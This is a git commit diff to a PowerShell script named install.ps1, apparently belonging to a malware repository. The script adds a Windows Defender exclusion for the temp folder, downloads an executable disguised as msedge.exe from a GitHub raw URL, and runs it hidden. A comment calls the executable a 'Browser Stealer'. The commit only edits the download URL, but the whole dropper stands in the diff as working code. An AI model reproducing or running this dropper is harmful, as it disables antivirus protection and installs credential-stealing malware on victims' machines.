8663db07378e59046e133d5d508be2a9a9fe3220
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 10:31:55 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -2,7 +2,7 @@
 Add-MpPreference -ExclusionPath $env:tmp
 
 # Download the exe and save it to temp directory
-iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe?raw=true" -outfile "$env:tmp\msedge.exe"
+iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"
 
 # Execute the Browser Stealer
 cd $env:tmp;Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
